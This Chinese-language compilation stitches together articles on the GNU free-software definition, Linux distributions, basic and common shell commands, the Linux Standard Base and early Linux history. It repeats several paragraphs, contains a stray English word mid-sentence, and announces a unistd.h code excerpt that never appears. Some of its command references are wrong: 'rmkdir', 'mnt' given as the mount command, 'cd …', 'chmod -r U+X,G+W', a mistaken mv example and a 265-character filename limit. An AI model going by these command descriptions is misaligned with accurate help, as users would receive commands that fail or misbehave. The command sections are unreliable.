你可能花钱购买了自由软件的拷贝，也可能免费拿到。但是无论你如何获得你的拷贝，你都有自由复制和修改该软件，乃至 出售 该软件的拷贝。GNU支持软件用户的自由，因为我们坚信这是每个用户应得的。有了这些自由，软件用户，无论是个人还是集体，都可以掌控所运行的软件，并决定这些程序如何为自己服务。如果一个软件令用户失去了这种控制权，我们则称它为"非自由"的，或"专有"的程序。与自由软件相反，非自由软件会操控它的用户，而软件的开发者则掌控着软件。这使得非自由软件成为了非正义力量的帮凶。

开源是另外一回事：它有基于不同价值观的非常不同的哲学。其实际定义也不同，但是几乎所有的开源程序事实上都是自由软件。GNU在为什么开源错失了自由软件的重点一文中阐述了这些不同。

如果一个软件是自由软件，那么它必须为用户提供以下四项基本自由：1. 无论用户出于何种目的，必须可以按照用户意愿，自由地运行该软件。2. 用户可以自由地学习并修改该软件，以此来帮助用户完成用户自己的计算。作为前提，用户必须可以访问到该软件的源代码。3. 用户可以自由地分发该软件的拷贝，这样就可以助人。4. 用户可以自由地分发该软件修改后的拷贝。借此，用户可以把改进后的软件分享给整个社区令他人也从中受益。作为前提，用户必须可以访问到该软件的源代码。

自由软件 不表示 非商业化。与之相反，自由软件必须可以商用、可以商业开发、可以商业发布。这个政策非常重要—缺乏这样的政策，自由软件将无法实现自己的目标。我们要邀请所有人使用 GNU 系统，包括商业机构及其员工。这就需要允许商用。我们期待许多程序的自由替代将来可以替换掉相应的专有程序，但是如果禁止商用就无法做到这些。我们期待商业产品包含有 GNU 系统的软件，并且成为商业发布定价的一部分。自由软件的商业开发不再那么不寻常；这些自由的商业软件非常重要。付费的、专业的自由软件技术支持填补了重要的需求空白。

因此，把商业使用、商业开发或商业发布排除在外会羁绊自由软件社区并阻碍其走向成功之路。我们一定要明确使用带有这种限制的许可证发布的软件不是自由软件。假如获得自由软件拷贝的（潜在）用户遵守了先前发布的自由软件的许可证条款，那么该自由软件必须为获得软件的该（潜在）用户提供自由软件的四项基本自由。在自由方面对用户加以限制或者要求付费才能实践这些自由和不赋予用户自由没有什么两样，因此这样的程序不是自由软件。

标题：Linux发行版
Linux内核（英语：Linux kernel），使用于类Unix操作系统，Linux家族的操作系统内核，以C语言写成，符合POSIX标准，采用GNU通用公共许可证释出，是目前最受欢迎的自由电脑操作系统内核。Linux最早是由芬兰黑客林纳斯·托瓦兹（Linus B. Torvalds）为尝试在英特尔x86架构上提供自由免费的类Unix操作系统而开发的。该计划开始于1991年，林纳斯·托瓦兹当时在Usenet新闻组comp.os.minix登载帖子，这份著名的帖子标示着Linux计划的正式开始。在计划的早期有一些Minix黑客提供了协助，而今天全球无数程序员正在为该计划无偿提供帮助。技术上说Linux是一个内核。“内核”指的是一个提供硬件抽象层、磁盘及文件系统控制、多任务等功能的系统软件。

Linux 发行版 (也被叫做 GNU/Linux 发行版) 是基于Linux内核的类Unix操作系统。Linux发行版通常包含了包括桌面环境、办公包、媒体播放器、数据库等应用软件。这些操作系统通常由Linux内核、以及来自GNU计划的大量的函数库，和基于X Window的图形界面。有些发行版考虑到容量大小而没有预装 X Window，而使用更加轻量级的软件，如：busybox, uclibc 或 dietlibc。现在有超过300个Linux发行版。大部分都正处于活跃的开发中，不断地改进。由于大多数软件包是自由软件和开源软件，所以Linux发行版的形式多种多样——从功能齐全的桌面系统以及服务器系统到小型系统 (通常在嵌入式设备，或者启动软盘)。除了一些定制软件 (如安装和配置工具)，发行版通常只是将特定的应用软件安装在一堆函数库和内核上，以满足特定用户的需求。

一个典型的Linux桌面发行版包括一个Linux 内核，来自GNU的工具和库，和附加的软件、文档，还有一个窗口系统，窗口管理器，和一个桌面环境。大部分包括的软件是自由软件/开源软件，它们同时以二进制可执行文件和源代码形式发布，只要用户愿意，还允许修改和重新编译源代码。还有一些可能是专有软件而不提供源代码。许多发行版像其他现代操作系统一样提供了一个安装系统定制的发行版像Gentoo Linux, T2 和 Linux From Scratch 提供所有软件的源代码以及最基本的内核、编译器、定制工具、安装工具等的可执行文件。安装程序针对用户不同的CPU编译成不同的文件。

深度操作系统基于Debian，Ubuntu也基于Debian，同属于Debian派系。Debian GNU / Linux是一种强调使用自由软件的发行版。它支持多种硬件平台。Debian及其派生发行版使用deb软件包格式，并使用dpkg及其前端作为包管理器。Red Hat Linux和SUSE Linux是最早使用RPM格式软件包的发行版，如今RPM格式已广泛运用于众多的发行版。这两种发行版后来都分为商业版本和社区支持版本。Red Hat Linux的社区支持版本现称为Fedora，商业版本则称为Red Hat Enterprise Linux。

Slackware 走了一条同其他的发布版本（Red Hat、Debian、Gentoo、SuSE、 Mandriva、Ubuntu等）不同的道路，它力图成为“UNIX风格”的Linux发布版本。它的方针是只吸收稳定版本的应用程序，并且缺少其他linux版本中那些为发布版本定制的配置工具。使用源代码 、Portage包管理系统(Gentoo发行版) 和Pacman包管理系统(Arch发行版)等其他发行版本。一般的迷你包，除了可以硬盘安装，也可以安装在闪存盘上。商业发行版比如Fedora (Red Hat), openSUSE (Novell), Ubuntu (Canonical公司), 和 Mandriva Linux,Slackware。社区发行版由自由软件社区提供支持，如Debian和Gentoo。

Linux原本指代的是GNU系统内部的一个核心部件（称为内核）。准确地说，现在用户运行的是 GNU/Linux 系统的发行版。实际上，“Linux”这个词要流行得多，今天对整个系统，人们就简单地称其为“Linux”。这引发了极大的争议。技术上，最终用户大量使用“GNU”，“Linux”只占少许，哲学上：自由软件运动的强势和动力都始自GNU项目，并一直为其所承载。因此称系统为 GNU/Linux 更加意味深长。称这个系统为 Linux 对那些常认为除了Windows还是Windows的计算机用户来说则更具有吸引力。我们两个名称都用，希望你不会介意。

由于大多数软件包是自由软件和开源软件，所以Linux发行版的形式多种多样——从功能齐全的桌面系统以及服务器系统到小型系统 (通常在嵌入式设备，或者启动软盘)。除了一些定制软件 (如安装和配置工具)，发行版通常只是将特定的应用软件安装在一堆函数库和内核上，以满足特定用户的需求。

Slackware 走了一条同其他的发布版本不同的道路，它力图成为“UNIX风格”的Linux发布版本。它的方针是只吸收稳定版本的应用程序，并且缺少其他linux版本中 those为发布版本定制的配置工具。

标题：Linux基础命令
黑色方块中的内容都是可以在命令行终端中执行的命令, 命令里面#(井号)开头的都是注释, 可以忽略。命令终端可以在指定目录或桌面右键打开终端开启, 也可以通过全局快捷键 `Ctrl+Alt+T` 来开启。

`ls` 是英文单词 list 的简写，其功能为列出目录的内容，是用户最常用的命令之一。Linux 文件或者目录名称最长可以有 265 个字符。其中参数 `.` 代表当前目录，参数 `..` 代表上一级目录。而以 `.` 开头的文件名(比如 `.anyFile.txt` )为隐藏文件，需要用 `-a` 参数才能显示出来，默认不显示隐藏文件。

列出当前目录下所有非隐藏文件和目录：`ls ./`。列出当前目录所在位置的上一级目录下所有非隐藏文件和目录：`ls ../`。显示指定目录下所有子目录与文件，包括隐藏文件：`ls -a`。以列表方式显示文件的详细信息：`ls -l`。`-h` 配合 `-l` 以人性化的方式显示文件大小：`ls -hl`。

`*` 代表文件名中所有字符。查找以te开头的文件：`ls te*`。查找结尾为html的文件：`ls *html`。`？` 代表文件名中任意一个字符。只找第一个字符任意，后缀为.c的文件：`ls ?.c`。只找只有三个字符，前两个字符为 `a.` ，最后一个字符任意的文件：`ls a.?`。`[]` 使用中括号将字符组括起来，表示可以匹配字符组中的任意一个。匹配a、b、c中的任意一个开头的对应文件：`ls [abc]name.txt`。在中括号内, 字符 `-` 用于表示字符范围。匹配从a到f范围内的的任意一个字符：`ls [a-f].txt`。找到从a到f范围内的的任意一个字符开头的任意文件：`ls [a-f]*`。如果要使通配符作为普通字符使用，可以在其前面加上转义字符 `\`。

`clear`作用为清除终端上的显示(类似于DOS的cls清屏功能)，也可使用快捷键：`Ctrl + l` ( “l” 为字母 )。

`cd`命令可以帮助用户切换工作目录。Linux所有的目录和文件名大小写敏感。cd后面可跟绝对路径，也可以跟相对路径。如果省略目录，则默认切换到当前用户的主目录。`cd` 切换到当前用户的主目录(/home/用户目录)；`cd ~ `切换到当前用户的主目录(/home/用户目录)；`cd .` 切换到当前目录；`cd .. `切换到上级目录；`cd - `可进入上次所在的目录。

使用`pwd`命令可以显示当前的工作目录，该命令很简单，直接输入`pwd`即可，后面不带参数。

通过`mkdir`命令可以创建一个新的目录。参数`-p`可递归创建目录。需要注意的是新建目录的名称不能与当前目录中已有的目录或文件同名，并且目录创建者必须对当前目录具有写权限。

可通过`rm`删除文件或目录。使用`rm`命令要小心，因为文件删除后不能恢复。为了防止文件误删，可以在`rm`后使用`-i`参数以逐个确认要删除的文件。`-i` 以进行交互式方式执行；`-f` 强制删除，忽略不存在的文件，无需提示；`-r `递归地删除目录下的内容，删除文件夹时必须加此参数。

`cp`命令的功能是将给出的文件或目录复制到另一个文件或目录中。`-a` 该选项通常在复制目录时使用，它保留链接、文件属性，并递归地复制目录，简单而言，保持文件原有属性；`-f` 已经存在的目标文件而不提示；`-i` 交互式复制，在覆盖目标文件之前将给出提示要求用户确认；`-r `若给出的源文件是目录文件，则`cp`将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名；`-v` 显示拷贝进度。

用户可以使用`mv`命令来移动文件或目录，也可以给文件或目录重命名。`-f` 禁止交互式操作，如有覆盖也不会给出提示；`-i` 确认交互方式操作，如果`mv`操作将导致对已存在的目标文件的覆盖，系统会询问是否重写，要求用户回答以避免误覆盖文件；`-v `显示移动进度。

用户可以通过`touch`来创建一个空的文件，demo如下：`touch hello.txt `。说明：在当前路径下创建名字为hello.txt的空文件。Linux系统中没有严格的后缀（格式），所以创建文件时可以命名为任意的文件名。

Linux允许将命令执行结果重定向到一个文件，本应显示在终端上的内容保存到指定文件中。如：`ls > test.txt `( test.txt 如果不存在，则创建，存在则覆盖其内容 )。注意：`>`输出重定向会覆盖原来的内容；`>>`输出重定向则会追加到文件的尾部。

查看内容时，在信息过长无法在一屏上显示时，会出现快速滚屏，使得用户无法看清文件的内容，此时可以使用`more`命令，每次只显示一页，按下空格键可以显示下一页，按下`q`键退出显示，按下`h`键可以获取帮助。`less # 功能和 more 类似, 用起来更方便`

管道：一个命令的输出可以通过管道做为另一个命令的输入。管道我们可以理解现实生活中的管子，管子的一头塞东西进去，另一头取出来，这里`“ | ”`的左右分为两端，左端塞东西(写)，右端取东西(读)。

Linux链接文件类似于Windows下的快捷方式。链接文件分为软链接和硬链接。软链接：软链接不占用磁盘空间，源文件删除则软链接失效。硬链接：硬链接只能链接普通文件，不能链接目录。使用格式：`ln `源文件 链接文件；`ln -s` 源文件 链接文件。如果没有`-s`选项代表建立一个硬链接文件，两个文件占用相同大小的硬盘空间，即使删除了源文件，链接文件还是存在，所以`-s`选项是更常见的形式。

Linux系统中`grep`命令是一种强大的文本搜索工具，`grep`允许对文本文件进行模式查找。如果找到匹配模式， `grep`打印包含模式的所有行。`grep`一般格式为：`grep [-选项] ‘搜索内容串’文件名 `。`-v` 显示不包含匹配文本的所有行（相当于求反）；`-n` 显示匹配行及行号；`-i` 忽略大小写。

`find`命令功能非常强大，通常用来在特定的目录下搜索符合条件的文件，也可以用来搜索特定用户属主的文件。常用用法：`find ./ -name test.sh `查找当前目录下所有名为test.sh的文件；`find ./ -name '*.sh' `查找当前目录下所有后缀为.sh的文件；`find /tmp -size +2M `查找在/tmp 目录下大于2M的文件。

`tar`是Unix/Linux中最常用的备份工具，此命令可以把一系列文件归档到一个大文件中，也可以把档案文件解开以恢复数据。`tar`使用格式 `tar [参数] 打包文件名 文件`。`-c `生成档案文件，创建打包文件；`-v `列出归档解档的详细过程，显示进度；`-f `指定档案文件名称，f后面一定是.tar文件，所以必须放选项最后；`-t `列出档案中包含的文件；`-x` 解开档案文件。

`tar`与`gzip`命令结合使用实现文件打包、压缩。`tar`只负责打包文件，但不压缩，用`gzip`压缩tar打包后的文件，其扩展名一般用xxxx.tar.gz。压缩用法：`tar cvzf 压缩包包名 文件1 文件2 ...`（-z指定格式为file.tar.gz）。解压用法：`tar zxvf 压缩包包名`；解压到指定目录：`-C `（大写字母“C”）。

`chmod` 修改文件权限有两种使用格式：字母法与数字法。字母法：`chmod` `u/g/o/a +/-/= rwx` 文件。u user（所有者）；g group（同组者）；o other（其他人）；a all（三者）。+增加权限；-撤销权限；=设定权限。r read（读取）；w write（写入）；x excute（执行）。数字法：r=4，w=2，x=1，-=0。如`chmod 751 file`表示所有者rwx，同组rx，其它x。参数`-R` 递归所有目录加上相同权限。

**更新仓库列表：** `sudo apt update`。**更新系统及应用：** `sudo apt dist-upgrade`。**安装依赖：** `sudo apt build-dep 应用名`。**下载源码:** `apt source 软件名`。**搜索依赖库或程序名:** `sudo apt-cache search 依赖名或者软件名`。**查看所有已安装软件名:** `apt list`。

标题：Linux常用命令
操作系统 Operating System 简称 OS，通俗讲就是一款软件，不过和一般的软件不同，操作系统是管理和控制计算机硬件与软件资源的计算机程序，是直接运行在“裸机”上的最基本的系统软件，任何其他的软件都必须在操作系统的支持下才能运行。

/var：包含在正常操作中被改变的文件、假脱机文件、记录文件、加锁文件、临时文件和页格式化文件等。/home：包含用户的文件：参数设置文件、个性化文件、文档、数据、EMALL、缓存数据等，每增加一个用户，系统就会根据其用户名在 home 目录下新建和其他用户同名的文件夹，用于保存其用户配置。/proc：包含虚幻的文件，他们实际上并不存在于磁盘上，也不占用任何空间，当查看这些文件时，实际上是在访问存在内存中的信息，这些信息用于访问系统。

/bin：包含系统启动时需要的执行文件（二进制），这些文件可以被普通用户使用。/etc：为操作系统的配置文件目录（防火墙、启动项）。/root：为系统管理员（也叫超级用户或根用户）的 Home 目录。/dev：为设备目录，Linux 下设备被当成文件，这样一来硬件被抽象化、便于读写、网络共享以及需要临时装载到文件系统中，正常情况下，设备会有一个独立的子目录，这些设备的内容会出现在独立的子目录下。

查看当前目录命令：`pwd`。打开文件夹命令：`cd`。打开指定文件夹：`cd [目录名称]`；打开当前用户的根目录：`cd ~`；返回上级目录：`cd …`；返回进入目录：`cd -`；打开根目录：`cd /`。

浏览目录下的文件列表命令：`ls`。以列的方式查看当前目录下的文件列表：`ls -l`；查看当前目录下所有的文件（包括隐藏文件）：`ls -a`；以列表的方式查看当前目录下的所有文件：`ls -la`。

创建文件目录命令：`mkdir`。新建文件目录：`mkdir 文件夹名称`；递归新建多级目录：`mkdir -p 文件夹名称`；例如在用户目录下新建 test 目录，命令这样写：`mkdir -p test/test1/test2/test3` 递归新建多级目录的写法。

删除文件目录命令：`rmkdir`（没有字母k）。删除指定目录：`rmkdir 目录名称`；递归删除指定目录及中间目录：`rmdir -p 目录名称`。

删除文件或者目录命令：`rm`。常用命令：`rm -rf [目录或文件]` `rm -ri [目录或文件]`；强制删除文件或目录：`rm -rf 目录或者文件`；在删除前询问是否确认删除：`rm -ri 目录或文件`。rm 命令中不跟 r 参数，无法删除目录，只能删除文件。

复制文件或目录命令：`cp`。递归复制目录1下的所有的文件和文件夹到目录2：`cp -r [目录1][目录2]`；执行复制操作时覆盖原有目录前询问用户：`cp -ri [目录1][目录2]`。

移动文件、修改文件名命令：`mv`。将文件夹1名称更改为文件夹2：`mv 文件1 文件2` (给文件更名)；将目录1的文件移动到目录2：`mv 目录2 目录2` (将目录1的文件移动到目录2)。

创建文件命令：`touch`。用法：touch 文件名称。

vi命令为UNIX或类UNIX操作系统的文件编辑命令，输入vi ++文件名进入vi模式。vi有三种模式：命令模式（打开文件后进入，可输入命令）、输入模式（用于修改文件，按Esc退出）、末行模式（esc + “:”进入，可保存退出“:wq!”或强制退出“:q!”）。

查看、编辑文件命令：`cat`。显示一个小的文件的内容：`cat 文件名称`；创建并打开一个新的文件：`cat > 文件名称`。

查看文件开头内容命令：`head`。语法：`head [参数] [文件名]`。例如，显示某个文件开始的n行数据：`head -n 文件名称`。

查看文件结尾内容命令：`tail`。动态加载某个文件的内容（常用于查看日志文件）：`tail -f 文件名称`；展示文件最后几行的数据：`tail -n 行数文件名称`。

用户是操作系统中一系列权限的集合体，有唯一标识UID。用户组是具有相同特征的用户的集合体，每个用户至少属于一个用户组，有唯一标识GID。root是权限最大的用户，属于root用户组，可添加删除用户，给用户赋予或回收文件权限。

切换用户命令：`su`。`su [用户名]` 或 `su -[用户名]`。前者临时切换，沿用原用户配置；后者切换后，环境变量等变为新用户配置。

查看当前登陆用户命令：`whoami`。查看当前用户所属分组命令：`groups`。查看当前用户UID和GID命令：`id`。

添加新用户命令：`useradd`。添加用户：`useradd 用户名`。添加用户并指定UID：`useradd -u 指定的UID 用户名`。

修改用户密码命令：`passwd`。例如：修改用户sang的密码：`passwd sang`。添加用户后需设置密码才能登陆。

删除用户命令：`userdel`。删除用户：`userdel 用户名`。删除用户并同时删除其登陆信息：`userdel -r 用户名`。

修改用户信息命令：`usermod`。语法：`usermod [选项] [参数] [用户名]`。修改用户登录名：`usermod -l 新用户名 旧用户名`。修改用户所属分组：`usermod -g 新组名称 用户名`。

添加用户组命令：`groupadd`。添加用户组：`groupadd 组名`。添加用户组并指定GID：`groupadd -g 组GID 组名`。

Linux文件权限用r、w、x表示读、写、执行。变更权限命令：`chmod`。权限模式用u（拥有者）、g（同组用户）、o（其他组用户），+/-表示赋予/收回权限。例如：`chmod -r U+X,G+W F01`。数字模式用二进制代表权限，如101(5)=r-x，111(7)=rwx，100(4)=r--。例如：`chmod 753 -r f01`。

查看进程命令：`ps`。`ps -ef | grep [进程关键字]`可查看进程，显示进程的PID（进程唯一标识）等信息。杀掉进程命令：`kill`。`kill -9 [PID]`用于关闭进程。

清屏命令：`clear`。查询命令详细参数命令：`man`。挂载命令：`mnt`。启动SSH服务：`service sshd start`；重启SSH服务：`service sshd restart`；关闭SSH服务：`service sshd stop`。

Linux软件安装方式有3种：tar安装（解压tar、tar.gz、tar.bz包并配置）、rpm安装（redhat系列的软件包管理器）、yum安装（自动下载rpm包，处理依赖）。tar解压命令：解压gzip包`tar -zxvf [包名]`；解压bz包`tar -jxvf [包名]`；解压普通包`tar -xvf [包名]`。

rpm命令用于安装卸载软件。查询是否安装某软件包：`rpm -qa|grep [软件包关键词]`。卸载软件包：`rpm -e 软件包全名`。安装软件包并查看进度：`rpm -ivh 软件包路径`。

其他常用命令：清屏命令：clear 查询命令详细参数命令：man 远程连接服务 SSH 相关命令：启动 SSH 服务：service sshd start 重启 SSH 服务：service sshd restart 关闭 SSH 服务：service sshd stop。注意：启动 JAR 时建议使用 nohup java -jar jar-0.0.1-SNAPSHOT.jar & 以确保窗口关闭后服务继续运行。

标题：Linux标准规范
目前 Linux 的发行版非常繁多，为了促进 Linux 不同发行版间的兼容性，LSB（Linux Standards Base）开发了一系列标准，使各种软件可以很好地在兼容 LSB 标准的系统上运行，从而可以帮助软件供应商更好地在 Linux 系统上开发产品，或将已有的产品移植到 Linux 系统上。

标准化目前已经成为 Linux 系统上的一个热门话题。实际上，在 Linux 诞生之初，这个问题就得到了重视。当 Linus 在开发 0.01 版本的 Linux 内核时，就开始关注 POSIX 标准的发展，他在 /include/unistd.h 文件中定义了几个与 POSIX 有关的宏，以下内容就节选自 0.01 版本内核的 /include/unistd.h 文件：

Unix 1969 年诞生于 AT&T 贝尔实验室，并在 1973 年使用 C 语言进行了重写，从此就具有了很好的可移植性。但是当 AT&T 在 1984 年由于分拆而得以进入计算机领域的市场之后，却引发了 Unix 业界的一场大战。当时最为主要的两个版本是 AT&T 的 System V 和伯克利的 BSD。二者在技术方面（例如终端）和文化方面都存在很多分歧，导致应用程序很难在不同的系统上平滑地进行移植，为了解决这个问题，IEEE 的 1003 委员会着手开发了一系列标准，这就是后来的 POSIX（Portable Operating System Interface for UNIX）标准。其目的是为那些兼容各种 UNIX 变种的应用程序制定应用程序编程接口（API）规范，从而确保这些应用程序的兼容性。这些标准后来被 ISO/IEC 采纳，成为 ISO/IEC 9945 标准。

Open Group 是现在 Unix 商标的拥有者，其前身是 X/Open。X/Open 是 Unix 厂商在 1984 年成立的一个联盟，它试图为众多 Unix 变种定义一个安全公共子集，因此即使在 Unix 混战的年代，也得到了比较好的发展。在 1993 年，包括主要 Unix 公司在内的75 家系统和软件供应商委托 X/Open 为 Unix 制定一个统一的规范。X/Open在现有标准基础上，增加了对终端进行处理的 API 和 X11 API，并全面兼容 1989 ANSI C 标准，最终诞生了第一版本的单一 Unix规范（Single Unix Specification，简称 SUS）。X/Open在 1996 年与 OSF（开放软件基金会）进行合并，成立了 Open Group 组织，专门从事开放标准的制定和推广工作，并对很多领域提供了认证，包括 Unix 操作系统、Motif 和 CDE（Common Desktop Environment）用户界面。

Austin Group 是在 1998 年成立的一个合作技术工作组，其使命是开发并维护 POSIX.1 和 SUS 规范。Austin Group 开发规范的方法是"write once, adopt everywhere"，即由 Austin Group 制定的规范既会成为 IEEE POSIX 规范，又会成为 Open Group 的 技术标准规范，以后又会被采纳为 ISO/IEC 的标准。新开发的规范后来就被标准化为 ISO/IEC 9945 和IEEE Std 1003.1，并成为 SUSV3 的核心部分。这种独特的开发模式最大限度地利用了业界领先的工作成果，将正式的标准化工作转化成了一个唯一的行为，并且吸引了广泛的参与者。Austin Group 目前有 500 多个参与者，工作组的主席是 Open Group 的 Andrew Josey。

在90年代中期，Linux也开始了自己的标准化努力。实际上，Linux一直都试图遵守POSIX标准，因此在源代码级上具有很好的兼容性，然而对于Linux来说，仅仅保证源码级的兼容性还不能完全满足要求：在Unix时代，大部分系统都使用的是专有的硬件，软件开发商必须负责将自己的应用程序从一个平台移植到其他平台上；每个系统的生命周期也很长，软件开发商可以投入足够的资源为各个平台发布二进制文件。然而Linux使用的最广泛的x86通用平台，其发行版是如此众多，而发展却如此之快，软件开发商不可能为每个发行版都发布一个二进制文件，因此就为Linux上的标准化提出了一个新的要求：二进制兼容性，即二进制程序不需要重新编译，就可以在其他发行版上运行。实际上，在Linux社区中第一个标准化努力是文件系统层次标准（Filesystem Hierarchy Standard，FHS），用来规范系统文件、工具和程序的存放位置和系统中的目录层次结构，例如ifconfig命令应该放在/usr/bin还是/usr/sbin目录中，光驱应该挂载到/mnt/cdrom中还是/media/cdrom中。这些需求最终共同促进了Linux Standard Base（LSB）项目的诞生。

为了保证 LSB 项目的良好运行，LSB 采用了自己的完整组织架构来负责整个项目的运行，包括主席、选举委员会、执行委员会：主席：由选举委员会选举产生，任期两年，负责 LSB 项目的整体运作，并对 FSG 和社区代表 LSB项目。目前的主席是 Debian 的创始人 Ian Murdock.。选举委员会：由所有对 LSB 作出贡献的人组成，负责在主席任期期满时选举下一任主席。执行委员会：由主席和各个子项目的领导人以及对 LSB项目有重大贡献的人组成，可以对外作为 LSB 项目的发言人。

LSB 项目包含几个子项目（也称为工作组），分别负责不同的职责范围，简介如下：Specification SubGroup：负责开 LSB 规范的开发与维护，还要负责 ISO/IEC 23360（即 ISO LSB 标准的维护）。具体职责如下：维护 LSB 规范数据库；编写 LSB 规范；开发并维护生成规范文档所需要的工具。LSB Tools SubGroup：负责以下子项目的开发和实现：SI（Sample Implementation）：遵守 LSB 规范的一个参考实现；Development Environment：开发符合 LSB 规范的应用程序的开发环境；Application Battery：符合 LSB 规范的样例应用程序，例如 lsb-apache。LSB Test SubGroup：负责按照 LSB 规范的定义，开发一些测试套件，来验证用户环境和应用程序是否符合 LSB 规范，主要包括：LSB Runtime Tests：包括ANSI、POSIX、LSB-OS、线程、用户和组、FHS、国际化、PAM（可插入认证模块）等测试套件；LSB VSW4/XTS5 Test：Xlib11及其扩展库的测试套件；LSB C++ Test：C++ 测试套件。LSB Desktop SubGroup：负责开发与桌面有关的规范的测试套件，用来验证用户环境和应用程序是否符合 LSB 规范，主要包括：GTK 库；OpenGL 库；PNG12库；JPEG 库；Fontconfig 库；GTK+ Stack 库；QT3/4 库；XML2 库。LSB Future SubGroup：负载开拓 LSB 的新领域，将已经发展比较成熟可以进行标准化但 LSB 尚未涉及的领域纳入 LSB 标准范围内。

LSB 对于标准的制定和推广遵循务实的原则，它自己不会自行制定标准然后强行要求业界接受，而是把业界中已经成熟的技术和规范采用标准化的形式固定下来，然后大力加以推广，这样可以更广泛地为软件供应商和用户接受。一个新领域要想纳入 LSB 标准的范畴，必须经过以下 3 个步骤：1. 鉴定：确认这个领域是否已经足够成熟，是否具有稳定的 ABI/API，是否需要进行标准化，以及是否依赖于尚未标准化的领域。 2. 调研：调查上游软件维护者是否还在积极维护，软件是否稳定，是否具有很好的向后兼容性。 3. 实现：将该领域加入 LSB 数据库、编写规范、编写测试套件、并将其加入开发环境、SI 和 APPBAT。 经过这 3 个步骤之后，LSB Future SubGroup 就会将其提交给 LSB 工作组，将其包含到 LSB 的下一个版本中进行发布，并对外提供认证服务。

在制定好标准并开发出测试套件之后，为了区分系统或应用程序是否兼容 LSB 标准， FSG 提供了 LSB 标准认证服务。任何 Linux 发行版厂商和应用程序开发商都可以进行 Linux 认证，目前提供的认证有两种：LSB 运行环境：为平台供应商提供的 LSB 标准认证；LSB 应用程序：为应用程序开发商提供的 LSB 标准认证。对于平台供应商来说，经过 LSB 认证之后，就可以确保自己的系统所提供的服务都是标准的，任何遵守 LSB 标准的应用程序都可以很好地在自己的系统上运行；而对于应用程序开发商来说，其意义则刚好相反：不需要担心自己的应用程序在遵守 LSB 标准的系统上的可移植性问题。LSB 认证过程包含以下步骤：注册：要进行 LSB 认证的第一个步骤是在 [https://www.freestandards.org/index.php?title=Special:Userlogin] 上先创建一个帐号，并注册您的公司和产品。测试和验证：使用 LSB 提供的测试工具，在您的测试系统上运行，并对结果进行分析，确保您的系统或应用程序遵守 LSB 规范。最终审计：在准备好正式提交测试结果之后，需要先签署 LSB 认证协议和 LSB 商标许可协议，并向 FSG 支付认证所需要的费用。然后 FSG 会有专人对测试结果进行审计，如果一切正常，就通过了 LSB 认证。通过 LSB 认证的产品都会在 [http://www.freestandards.org/en/Products] 公开发布。

LSB 项目最初发起于 1998 年 5 月，其项目启动宣言得到了 Linus Torvalds、Bruce Perens、Eric Raymond 等人的签名支持，当时的目标是建立一系列构建 Linux 发行版所采用的源代码应该遵循的标准，并提供一个参考平台。2000 年 5 月，LSB 成为 Free Standards Group（FSG） 的一个工作组。FSG 是一个独立的非盈利组织，专注于通过开发和促进标准来加速开源软件的发展。从 2001 年 6 月发布第一个正式版本的规范以后，LSB 规范几乎每 6 个月都会进行一次更新。截止到 2005 年 7 月发布的 3.0 版本为止，LSB 重点关注的是服务器端的使用，这与 Linux 在服务器端得到了广泛的应用是一致的。这个规范已经被 ISO 采纳为国际标准 23360。目前最新的版本规范是 2005 年 10 月发布的 LSB 3.1，目前它可以支持 7 种体系结构：IA32、IA64、X86_64、PPC32、PPC64、S390、S390x。

为了解决不同Linux发行版中版本信息文件不一致的问题，LSB规范中增加了对lsb_release接口及其输出格式的定义：lsb_release的功能是打印与发行版本相关的信息，必须实现特定选项。在通过LSB认证的系统上，存在包含lsb_release接口实现的包，例如RHEL4U3上的redhat-lsb包和SLES9SP3上的lsb包，两者都包含/usr/bin/lsb_release和/lib/ld-lsb.so.3文件。/lib/ld-lsb.so.3是指向ld-linux.so.2的符号链接，/usr/bin/lsb_release是shell脚本，执行lsb_release -a可获取发行版本信息，不同系统的输出格式一致。

LSB目前是 FSG（Free Standards Group）中最为活跃的一个工作组，其使命是开发一系列标准来增强 Linux 发行版的兼容性，使各种软件可以很好地在兼容 LSB 标准的系统上运行，从而可以帮助软件供应商更好地在 Linux 系统上开发产品，或将已有的产品移植到 Linux 系统上。

标题：Linux桌面演进
当我们坐在 Debian、Fedora、Suse 等发行版本最新版本前，看着桌面操作的各种华丽效果，享受着各种易用的图形界面应用给我们带来的便利，是否对我们面前的这个操作系统如何而来有过思考？我们是否考虑到在感恩节的时候，对隐藏在这个操作系统背后努力奉献时间的人们抱有感恩之心呢？Linux Kernel，一路走来，风雨兼程，岁月有痕。

在故事的开头，要介绍下 Unix。Unix 由 Ken Thompson 和 Dennis Ritchie（已离世）于 1969 年开发。此后，整个 80 年代，基于 Unix 的大量项目应运而生。而后，RMS 发起 GNU 项目，BSD 诞生，Andrew S Tanenbaum 教授开发了用于教学的 MINIX（Mini-Unix）。1991 年，年轻的芬兰学生 Linus Torvalds 将其开发的内核带到这个世界。关于 Linux 开始的开始，有很多传说，如 Linus 在玩 MINIX 时不小心擦除了分区上的数据，这惹怒了 Linus，Fuck，自己搞一个操作系统~ 另一个传说：是他在改进 MINIX 功能时，不小心开发了自己的内核。如论事实如何，最终 Linux 带给了这个世界难以想象的变革。此时，Manchester 计算机中心使用一块组合的 boot/root 磁盘，创建了第一个 Linux 发行版本，名为 MCC Interim Linux。

在不长的时间，1992~1994 年间，我们看到了最具有影响力的现在 Linux 桌面发行版本的创世：Slackware，Red Hat 和 Debian。此时，Linux 内核版本也升到了 0.95 ——第一个可以运行 X 窗口系统的内核版本。Slackware 是第一批采用新内核的发行版本之一。Slackware 开始是以“Softlanding Linux System”（SLS）形式开始的，由 Peter MacDonald 创建于 1992 年。SLS 走在了时代的前面，它不仅是第一个使用了 0.99 内核版本，也同时采用了 TCP/IP 栈和 X 窗口系统。SLS 不久的时间，它由 Patrick Volkerding 的 Slackware 取代，Slackware 成为寿命最长的 Linux 发行版本。SLS 不仅孕育了 Slackware。因其糟糕的交互，其他的用户默默离开，开始创建自己的 Linux 发行版本新分支。1993 年，lan Murdock 发布了 Debian Linux。Debian 这个名称由他的女朋友名字 Debra Lynn 和自己的名字组合而成。随着 Slackware 的演进，一些商业公司开始出现。1994 年，Software und System-Entwicklung 公司创建，可能 S.U.S.E 更为大家所熟知。1994 年 11 月 3 日，Red Hat 商业 Linux 成立。创建人 Marc Ewing，RedHat 是他根据大学时戴的一顶帽子命名。1994 年 3 月 14 日，Linux 1.0.0 发布，代码共计 176, 250 行。

